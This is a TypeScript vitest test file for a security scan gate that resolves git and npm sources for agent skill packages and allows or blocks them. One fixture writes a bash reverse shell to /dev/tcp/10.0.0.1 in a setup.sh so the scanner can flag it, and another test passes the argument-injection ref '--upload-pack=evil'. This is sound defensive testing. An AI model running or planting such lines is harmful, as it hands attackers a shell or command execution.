import { execFileSync } from "node:child_process";
import { createHash } from "node:crypto";
import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  type AcceptedContentFinding,
  acquireNpmTree,
  assertProvisionAuthorized,
  BindingNotSupportedError,
  BindingScanError,
  type DimensionInspector,
  readScanAcceptanceArtifact,
  resolvedSourceDigest,
  resolveGitSource,
  resolveNpmSource,
  runFastScanGate,
  type ScanDisposition,
  scannableFromGit,
} from "../../src/binding/scan-gate.js";
import { defaultRunner, fakeRunner } from "../../src/internals/proc.js";

const SHA256 = /^[0-9a-f]{64}$/;
const SHA40 = /^[0-9a-f]{40}$/;
const INTEGRITY = `sha512-${"A".repeat(86)}==`;

let cacheHome: string;
let repoDir: string;

function git(dir: string, args: string[]): void {
  execFileSync("git", args, { cwd: dir, stdio: "pipe" });
}

function initGitRepo(dir: string, files: Record<string, string>): void {
  mkdirSync(dir, { recursive: true });
  git(dir, ["init", "-b", "main"]);
  git(dir, ["config", "user.email", "test@example.com"]);
  git(dir, ["config", "user.name", "Binding Test"]);
  git(dir, ["config", "commit.gpgsign", "false"]);
  for (const [rel, content] of Object.entries(files)) {
    const abs = join(dir, rel);
    mkdirSync(dirname(abs), { recursive: true });
    writeFileSync(abs, content);
  }
  git(dir, ["add", "-A"]);
  git(dir, ["commit", "-m", "init"]);
}

beforeEach(() => {
  cacheHome = mkdtempSync(join(tmpdir(), "aih-binding-cache-"));
  repoDir = mkdtempSync(join(tmpdir(), "aih-binding-repo-"));
});

afterEach(() => {
  rmSync(cacheHome, { recursive: true, force: true });
  rmSync(repoDir, { recursive: true, force: true });
});

const producedClean: DimensionInspector = {
  dimension: "test-complete",
  run: () => ({ dimension: "test-complete", status: "produced", findings: [] }),
};

const producedCritical: DimensionInspector = {
  dimension: "test-critical",
  run: () => ({
    dimension: "test-critical",
    status: "produced",
    findings: [
      { code: "trust.malicious-code", severity: "critical", detail: "boom", coverage: "complete" },
    ],
  }),
};

// Simulates a future deep dimension (W7) that is unavailable, so coverage is
// incomplete even though the W2 default inspectors all produce.
const missingDim: DimensionInspector = {
  dimension: "test-deep",
  run: () => ({
    dimension: "test-deep",
    status: "missing",
    reason: "deep scanner unavailable",
    findings: [],
  }),
};

describe("git source resolution (D7 exact identity)", () => {
  it("resolves a ref to an exact 40-char SHA, checks out, and hashes the tree", async () => {
    initGitRepo(repoDir, { "SKILL.md": "# skill\n", "src/index.ts": "export const x = 1;\n" });
    const resolved = await resolveGitSource(
      { repository: repoDir, ref: "HEAD" },
      { runner: defaultRunner, cacheHome },
    );
    expect(resolved.kind).toBe("git");
    expect(resolved.commitSha).toMatch(SHA40);
    expect(resolved.treeDigest).toMatch(SHA256);
    expect(existsSync(resolved.treePath)).toBe(true);
    expect(resolvedSourceDigest(resolved)).toBe(resolved.treeDigest);
  });

  it("produces the same tree digest after the derived checkout cache is deleted (rebuildable)", async () => {
    initGitRepo(repoDir, { "SKILL.md": "# skill\n" });
    const first = await resolveGitSource(
      { repository: repoDir, ref: "HEAD" },
      { runner: defaultRunner, cacheHome },
    );
    rmSync(join(cacheHome, "cache"), { recursive: true, force: true });
    const second = await resolveGitSource(
      { repository: repoDir, ref: "HEAD" },
      { runner: defaultRunner, cacheHome },
    );
    expect(second.commitSha).toBe(first.commitSha);
    expect(second.treeDigest).toBe(first.treeDigest);
  });

  it("accepts an exact commit SHA input without a ref resolution round-trip", async () => {
    initGitRepo(repoDir, { "SKILL.md": "# skill\n" });
    const head = execFileSync("git", ["rev-parse", "HEAD"], { cwd: repoDir }).toString().trim();
    const resolved = await resolveGitSource(
      { repository: repoDir, commitSha: head },
      { runner: defaultRunner, cacheHome },
    );
    expect(resolved.commitSha).toBe(head);
  });

  it("fails closed when ls-remote yields no commit SHA", async () => {
    const runner = fakeRunner((argv) => (argv.includes("ls-remote") ? { stdout: "" } : undefined));
    await expect(
      resolveGitSource({ repository: "affaan-m/ECC", ref: "HEAD" }, { runner, cacheHome }),
    ).rejects.toBeInstanceOf(BindingScanError);
  });

  it("maps a bare owner/repo slug to its canonical GitHub https remote for ls-remote and clone", async () => {
    const seen: string[][] = [];
    const runner = fakeRunner((argv) => {
      seen.push([...argv]);
      if (argv[1] === "ls-remote") return { stdout: `${"a".repeat(40)}\tHEAD\n` };
      if (argv[1] === "clone") return { code: 1, stderr: "transport capture only" };
      return undefined;
    });
    await expect(
      resolveGitSource({ repository: "obra/superpowers", ref: "HEAD" }, { runner, cacheHome }),
    ).rejects.toBeInstanceOf(BindingScanError);
    const lsRemote = seen.find((argv) => argv[1] === "ls-remote") ?? [];
    const clone = seen.find((argv) => argv[1] === "clone") ?? [];
    expect(lsRemote[3]).toBe("https://github.com/obra/superpowers.git");
    expect(clone[clone.length - 2]).toBe("https://github.com/obra/superpowers.git");
    expect(lsRemote).not.toContain("obra/superpowers");
    expect(clone).not.toContain("obra/superpowers");
  });

  it("clones via the mapped GitHub remote when a commitSha pin skips ls-remote (W4 live-run regression)", async () => {
    const seen: string[][] = [];
    const runner = fakeRunner((argv) => {
      seen.push([...argv]);
      if (argv[1] === "clone") return { code: 1, stderr: "transport capture only" };
      return undefined;
    });
    await expect(
      resolveGitSource(
        { repository: "obra/superpowers", commitSha: "d884ae04edebef577e82ff7c4e143debd0bbec99" },
        { runner, cacheHome },
      ),
    ).rejects.toBeInstanceOf(BindingScanError);
    expect(seen.some((argv) => argv[1] === "ls-remote")).toBe(false);
    const clone = seen.find((argv) => argv[1] === "clone") ?? [];
    expect(clone[clone.length - 2]).toBe("https://github.com/obra/superpowers.git");
  });

  it("gives transport git calls a tree-scaled timeout instead of proc's 30s default (W4 attempt-4 live-run regression)", async () => {
    const seen: Array<{ argv: string[]; timeoutMs?: number }> = [];
    const runner = fakeRunner((argv, opts) => {
      seen.push({ argv: [...argv], timeoutMs: opts?.timeoutMs });
      if (argv[1] === "ls-remote") return { stdout: `${"a".repeat(40)}\tHEAD\n` };
      if (argv[3] === "checkout") return { code: 1, stderr: "transport capture only" };
      return undefined;
    });
    await expect(
      resolveGitSource({ repository: "samartomar/ECC", ref: "HEAD" }, { runner, cacheHome }),
    ).rejects.toBeInstanceOf(BindingScanError);
    for (const op of ["ls-remote", "clone"]) {
      expect(seen.find((call) => call.argv[1] === op)?.timeoutMs).toBe(120_000);
    }
    expect(seen.find((call) => call.argv[3] === "checkout")?.timeoutMs).toBe(120_000);
  });

  it("passes an https repository locator to git verbatim", async () => {
    const seen: string[][] = [];
    const runner = fakeRunner((argv) => {
      seen.push([...argv]);
      if (argv[1] === "clone") return { code: 1, stderr: "transport capture only" };
      return undefined;
    });
    await expect(
      resolveGitSource(
        { repository: "https://example.com/frameworks/superpowers.git", commitSha: "a".repeat(40) },
        { runner, cacheHome },
      ),
    ).rejects.toBeInstanceOf(BindingScanError);
    const clone = seen.find((argv) => argv[1] === "clone") ?? [];
    expect(clone[clone.length - 2]).toBe("https://example.com/frameworks/superpowers.git");
  });

  it("passes an scp-like repository locator to git verbatim", async () => {
    const seen: string[][] = [];
    const runner = fakeRunner((argv) => {
      seen.push([...argv]);
      if (argv[1] === "clone") return { code: 1, stderr: "transport capture only" };
      return undefined;
    });
    await expect(
      resolveGitSource(
        { repository: "git@github.com:obra/superpowers.git", commitSha: "a".repeat(40) },
        { runner, cacheHome },
      ),
    ).rejects.toBeInstanceOf(BindingScanError);
    const clone = seen.find((argv) => argv[1] === "clone") ?? [];
    expect(clone[clone.length - 2]).toBe("git@github.com:obra/superpowers.git");
  });

  it("rejects an unsafe ref", async () => {
    await expect(
      resolveGitSource(
        { repository: "affaan-m/ECC", ref: "--upload-pack=evil" },
        { runner: defaultRunner, cacheHome },
      ),
    ).rejects.toBeInstanceOf(BindingScanError);
  });
});

describe("npm source resolution (minimal; tarball deferred)", () => {
  it("resolves package identity from injected registry metadata", async () => {
    const resolved = await resolveNpmSource(
      { package: "@obra/superpowers", version: "6.0.0" },
      { fetchMetadata: () => ({ version: "6.0.0", integrity: INTEGRITY }) },
    );
    expect(resolved).toEqual({
      kind: "npm",
      package: "@obra/superpowers",
      exactVersion: "6.0.0",
      integrity: INTEGRITY,
    });
    expect(resolvedSourceDigest(resolved)).toBe(INTEGRITY);
  });

  it("fails closed when registry metadata is not an exact version or SRI integrity", async () => {
    await expect(
      resolveNpmSource(
        { package: "x", version: "latest" },
        { fetchMetadata: () => ({ version: "latest", integrity: INTEGRITY }) },
      ),
    ).rejects.toBeInstanceOf(BindingScanError);
  });

  it("does not fake tarball acquisition success", () => {
    const resolved = {
      kind: "npm" as const,
      package: "x",
      exactVersion: "1.0.0",
      integrity: INTEGRITY,
    };
    expect(() => acquireNpmTree(resolved)).toThrow(BindingNotSupportedError);
  });
});

describe("fast scan disposition (D12 gate + posture-graded coverage)", () => {
  async function scannable() {
    initGitRepo(repoDir, { "SKILL.md": "# skill\n", "README.md": "hello\n" });
    const resolved = await resolveGitSource(
      { repository: repoDir, ref: "HEAD" },
      { runner: defaultRunner, cacheHome },
    );
    return scannableFromGit(resolved);
  }

  it("allows a clean, fully-covered tree at every posture (all 11 dimensions produced)", async () => {
    const src = await scannable();
    for (const posture of ["vibe", "team", "enterprise"] as const) {
      const disposition = runFastScanGate(src, { posture }, { cacheHome });
      expect(disposition.verdict).toBe("allow");
      expect(disposition.digest).toBe(src.digest);
      expect(disposition.findings.every((f) => f.coverage === "complete")).toBe(true);
    }
  });

  it("blocks at team/enterprise when a (future deep) dimension is unavailable (incomplete coverage fails closed)", async () => {
    const src = await scannable();
    for (const posture of ["team", "enterprise"] as const) {
      const disposition = runFastScanGate(
        src,
        { posture },
        { cacheHome, inspectors: [producedClean, missingDim] },
      );
      expect(disposition.verdict).toBe("block");
      expect(disposition.findings.some((f) => f.coverage === "incomplete")).toBe(true);
    }
  });

  it("blocks incomplete coverage at vibe without the explicit allowance", async () => {
    const src = await scannable();
    expect(
      runFastScanGate(
        src,
        { posture: "vibe" },
        { cacheHome, inspectors: [producedClean, missingDim] },
      ).verdict,
    ).toBe("block");
  });

  it("allows incomplete coverage at vibe only when the policy opts in", async () => {
    const src = await scannable();
    expect(
      runFastScanGate(
        src,
        { posture: "vibe", allowIncompleteAtVibe: true },
        { cacheHome, inspectors: [producedClean, missingDim] },
      ).verdict,
    ).toBe("allow");
  });

  it("allows at enterprise when injected inspectors give complete clean coverage", async () => {
    const src = await scannable();
    const disposition = runFastScanGate(
      src,
      { posture: "enterprise" },
      { cacheHome, inspectors: [producedClean] },
    );
    expect(disposition.verdict).toBe("allow");
    expect(disposition.findings.every((f) => f.coverage === "complete")).toBe(true);
  });

  it("blocks on a danger finding even at vibe with incomplete allowance (danger floor)", async () => {
    const src = await scannable();
    const disposition = runFastScanGate(
      src,
      { posture: "vibe", allowIncompleteAtVibe: true },
      { cacheHome, inspectors: [producedClean, producedCritical] },
    );
    expect(disposition.verdict).toBe("block");
  });

  it("flags a real malicious-code shape from the default inspectors", async () => {
    initGitRepo(repoDir, {
      "SKILL.md": "# skill\n",
      "setup.sh": "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
    });
    const resolved = await resolveGitSource(
      { repository: repoDir, ref: "HEAD" },
      { runner: defaultRunner, cacheHome },
    );
    const disposition = runFastScanGate(
      scannableFromGit(resolved),
      { posture: "vibe", allowIncompleteAtVibe: true },
      { cacheHome },
    );
    expect(disposition.verdict).toBe("block");
    expect(disposition.findings.some((f) => f.severity === "critical")).toBe(true);
  });
});

describe("scan cache (derived, rebuildable)", () => {
  it("keeps the validation outcome unchanged after the derived caches are deleted", async () => {
    initGitRepo(repoDir, { "SKILL.md": "# skill\n" });
    const policy = { posture: "enterprise" } as const;
    const resolved = await resolveGitSource(
      { repository: repoDir, ref: "HEAD" },
      { runner: defaultRunner, cacheHome },
    );
    const first = runFastScanGate(scannableFromGit(resolved), policy, { cacheHome });
    expect(existsSync(join(cacheHome, "scan-cache", `${resolved.treeDigest}.json`))).toBe(true);

    // Delete BOTH derived caches, then rebuild the whole chain from the committed
    // source: re-resolution re-clones and re-hashes; the gate recomputes.
    rmSync(join(cacheHome, "scan-cache"), { recursive: true, force: true });
    rmSync(join(cacheHome, "cache"), { recursive: true, force: true });
    const reResolved = await resolveGitSource(
      { repository: repoDir, ref: "HEAD" },
      { runner: defaultRunner, cacheHome },
    );
    const second = runFastScanGate(scannableFromGit(reResolved), policy, { cacheHome });

    expect(second.verdict).toBe(first.verdict);
    expect(second.digest).toBe(first.digest);
    expect(second.findings).toEqual(first.findings);
  });

  it("recomputes rather than failing closed when the derived cache is corrupt", async () => {
    initGitRepo(repoDir, { "SKILL.md": "# skill\n" });
    const resolved = await resolveGitSource(
      { repository: repoDir, ref: "HEAD" },
      { runner: defaultRunner, cacheHome },
    );
    const src = scannableFromGit(resolved);
    runFastScanGate(src, { posture: "enterprise" }, { cacheHome });
    writeFileSync(join(cacheHome, "scan-cache", `${src.digest}.json`), "{ corrupt");
    expect(() => runFastScanGate(src, { posture: "enterprise" }, { cacheHome })).not.toThrow();
  });
});

describe("provision authorization guard (D12 code-path invariant)", () => {
  async function allowDisposition(): Promise<{ disposition: ScanDisposition; digest: string }> {
    initGitRepo(repoDir, { "SKILL.md": "# skill\n" });
    const resolved = await resolveGitSource(
      { repository: repoDir, ref: "HEAD" },
      { runner: defaultRunner, cacheHome },
    );
    const src = scannableFromGit(resolved);
    const disposition = runFastScanGate(
      src,
      { posture: "enterprise" },
      { cacheHome, inspectors: [producedClean] },
    );
    return { disposition, digest: src.digest };
  }

  it("authorizes an allow disposition whose digest matches the resolved source", async () => {
    const { disposition, digest } = await allowDisposition();
    expect(() => assertProvisionAuthorized(disposition, digest)).not.toThrow();
  });

  it("rejects a digest mismatch (stale disposition)", async () => {
    const { disposition } = await allowDisposition();
    expect(() => assertProvisionAuthorized(disposition, "f".repeat(64))).toThrow(BindingScanError);
  });

  it("rejects a block verdict", async () => {
    initGitRepo(repoDir, { "SKILL.md": "# skill\n" });
    const resolved = await resolveGitSource(
      { repository: repoDir, ref: "HEAD" },
      { runner: defaultRunner, cacheHome },
    );
    const src = scannableFromGit(resolved);
    const blocked = runFastScanGate(
      src,
      { posture: "enterprise" },
      {
        cacheHome,
        inspectors: [producedCritical],
      },
    );
    expect(() => assertProvisionAuthorized(blocked, src.digest)).toThrow(BindingScanError);
  });

  it("rejects a forged, structurally identical disposition with no brand", async () => {
    const { digest } = await allowDisposition();
    const forged = {
      digest,
      verdict: "allow",
      findings: [],
      posture: "enterprise",
      producedAt: new Date().toISOString(),
    } as unknown as ScanDisposition;
    expect(() => assertProvisionAuthorized(forged, digest)).toThrow(BindingScanError);
  });
});

describe("maintainer-accepted content findings (scan-acceptance baseline)", () => {
  // U+200B inside instruction text: a genuinely hidden character the real
  // content-risk inspector maps to trust.hidden-unicode (high).
  const ZWSP = String.fromCharCode(0x200b);
  const HIDDEN_SKILL = `# skill\n\nzero${ZWSP}width instruction\n`;

  function sha256Utf8(text: string): string {
    return createHash("sha256").update(text, "utf8").digest("hex");
  }

  async function hiddenUnicodeScannable(extraFiles: Record<string, string> = {}) {
    initGitRepo(repoDir, { "SKILL.md": HIDDEN_SKILL, "README.md": "hello\n", ...extraFiles });
    const resolved = await resolveGitSource(
      { repository: repoDir, ref: "HEAD" },
      { runner: defaultRunner, cacheHome },
    );
    return scannableFromGit(resolved);
  }

  const acceptSkill: AcceptedContentFinding = {
    repository: "test/fixture",
    code: "trust.hidden-unicode",
    path: "SKILL.md",
    fileSha256: sha256Utf8(HIDDEN_SKILL),
  };

  it("blocks an unaccepted hidden-unicode high and pins it with path + content hash", async () => {
    const src = await hiddenUnicodeScannable();
    const disposition = runFastScanGate(src, { posture: "vibe" }, { cacheHome });
    expect(disposition.verdict).toBe("block");
    const finding = disposition.findings.find((f) => f.code === "trust.hidden-unicode");
    expect(finding?.path).toBe("SKILL.md");
    expect(finding?.contentSha256).toBe(sha256Utf8(HIDDEN_SKILL));
    expect(finding?.accepted).toBeUndefined();
  });

  it("allows when every high finding matches an accepted triple, keeping the findings marked in evidence", async () => {
    const src = await hiddenUnicodeScannable();
    const disposition = runFastScanGate(
      src,
      { posture: "vibe", acceptedFindings: [acceptSkill] },
      { cacheHome },
    );
    expect(disposition.verdict).toBe("allow");
    const finding = disposition.findings.find((f) => f.code === "trust.hidden-unicode");
    expect(finding?.accepted).toBe(true);
    expect(finding?.path).toBe("SKILL.md");
  });

  it("keeps blocking when the accepted entry's content hash no longer matches (content-pinned)", async () => {
    const src = await hiddenUnicodeScannable();
    const stale: AcceptedContentFinding = { ...acceptSkill, fileSha256: "a".repeat(64) };
    const disposition = runFastScanGate(
      src,
      { posture: "vibe", acceptedFindings: [stale] },
      { cacheHome },
    );
    expect(disposition.verdict).toBe("block");
  });

  it("keeps blocking when a new high finding appears alongside accepted ones", async () => {
    const src = await hiddenUnicodeScannable({ "notes/OTHER.md": `also${ZWSP}hidden\n` });
    const disposition = runFastScanGate(
      src,
      { posture: "vibe", acceptedFindings: [acceptSkill] },
      { cacheHome },
    );
    expect(disposition.verdict).toBe("block");
  });

  it("never accepts a critical finding, even when the baseline lists its exact triple", async () => {
    const src = await hiddenUnicodeScannable();
    const criticalWithPin: DimensionInspector = {
      dimension: "test-critical-pinned",
      run: () => ({
        dimension: "test-critical-pinned",
        status: "produced",
        findings: [
          {
            code: "trust.malicious-code",
            severity: "critical",
            detail: "boom",
            coverage: "complete",
            path: "x.js",
            contentSha256: "ab".repeat(32),
          },
        ],
      }),
    };
    const disposition = runFastScanGate(
      src,
      {
        posture: "vibe",
        acceptedFindings: [
          {
            repository: "test/fixture",
            code: "trust.malicious-code",
            path: "x.js",
            fileSha256: "ab".repeat(32),
          },
        ],
      },
      { cacheHome, inspectors: [criticalWithPin] },
    );
    expect(disposition.verdict).toBe("block");
  });

  it("ignores a schemaVersion-1 scan-cache record (pre-acceptance format) and recomputes", async () => {
    initGitRepo(repoDir, { "SKILL.md": "# skill\n" });
    const resolved = await resolveGitSource(
      { repository: repoDir, ref: "HEAD" },
      { runner: defaultRunner, cacheHome },
    );
    const src = scannableFromGit(resolved);
    expect(runFastScanGate(src, { posture: "vibe" }, { cacheHome }).verdict).toBe("allow");
    // A stale v1 record fabricating a critical finding must be a cache MISS,
    // not a served verdict: the acceptance fields it cannot carry would
    // otherwise silently disable the baseline for this digest.
    writeFileSync(
      join(cacheHome, "scan-cache", `${src.digest}.json`),
      `${JSON.stringify({
        schemaVersion: 1,
        digest: src.digest,
        scannedAt: "2026-01-01T00:00:00.000Z",
        reports: [
          {
            dimension: "legacy",
            status: "produced",
            findings: [
              {
                code: "trust.malicious-code",
                severity: "critical",
                detail: "stale",
                coverage: "complete",
              },
            ],
          },
        ],
      })}\n`,
    );
    expect(runFastScanGate(src, { posture: "vibe" }, { cacheHome }).verdict).toBe("allow");
  });

  it("ships a valid acceptance artifact restricted to content-risk codes", () => {
    const artifact = readScanAcceptanceArtifact();
    expect(artifact.accepted.length).toBeGreaterThan(0);
    const contentRiskCodes = new Set([
      "trust.hidden-unicode",
      "trust.prompt-injection",
      "trust.visible-unicode",
    ]);
    for (const entry of artifact.accepted) {
      expect(contentRiskCodes.has(entry.code)).toBe(true);
      expect(entry.fileSha256).toMatch(SHA256);
      expect(entry.path.length).toBeGreaterThan(0);
      expect(entry.path).not.toContain("\\");
    }
  });

  it("carries exactly the eight ruled gstack acceptances (rule-8 + final calibration)", () => {
    const artifact = readScanAcceptanceArtifact();
    const gstack = artifact.accepted.filter((entry) => entry.repository === "garrytan/gstack");
    // Every gstack entry is profile-scoped and human-reviewed; the artifact stays
    // small (ruling point 11) — no per-occurrence typography entries.
    expect(gstack).toHaveLength(8);
    for (const entry of gstack) {
      expect(entry.profile).toBe("claude:prefix:quiet:no-plan-tune-hooks");
    }
    const byPath = new Map(gstack.map((entry) => [entry.path, entry]));

    // Three human-reviewed prompt-injection workflow-control entries (rule-8).
    const doc = byPath.get("document-generate/SKILL.md");
    const ios = byPath.get("ios-qa/SKILL.md");
    const office = byPath.get("office-hours/SKILL.md");
    for (const entry of [doc, ios, office]) {
      expect(entry?.code).toBe("trust.prompt-injection");
    }
    expect(doc?.acceptanceClass).toBe("EXPECTED_SKILL_WORKFLOW_CONTROL");
    expect(ios?.acceptanceClass).toBe("EXPECTED_SKILL_WORKFLOW_CONTROL");
    expect(office?.acceptanceClass).toBe("EXPECTED_CROSS_MODEL_BOUNDARY_INSTRUCTION");
    expect(office?.conditions).toContain("codex-reviews-default-off");
    expect(office?.conditions).toContain("runtime-proof-no-codex-process-or-network-when-disabled");

    // Four sanitizer-family entries + one inspected display-glyph entry (final
    // calibration): sanitizer characters are proven detection/replacement
    // sentinel literals; the gstack-decision.ts em-dashes were individually
    // inspected as display-only comment/error-string text (point 8). The ~290
    // OTHER visible-typography findings are demoted at the gate, NOT accepted —
    // so hidden-unicode acceptances are exactly these five.
    const hiddenUnicode = gstack.filter((entry) => entry.code === "trust.hidden-unicode");
    expect(hiddenUnicode).toHaveLength(5);
    const byClass = new Map<string, string[]>();
    for (const entry of hiddenUnicode) {
      const cls = entry.acceptanceClass ?? "(none)";
      byClass.set(cls, [...(byClass.get(cls) ?? []), entry.path]);
    }
    expect(new Set(byClass.get("EXPECTED_SANITIZER_SENTINEL_LITERAL"))).toEqual(
      new Set([
        "lib/redact-engine.ts",
        "browse/src/server.ts",
        "browse/src/sanitize.ts",
        "browse/src/content-security.ts",
      ]),
    );
    expect(byClass.get("EXPECTED_UI_DISPLAY_GLYPH")).toEqual(["lib/gstack-decision.ts"]);
  });
});
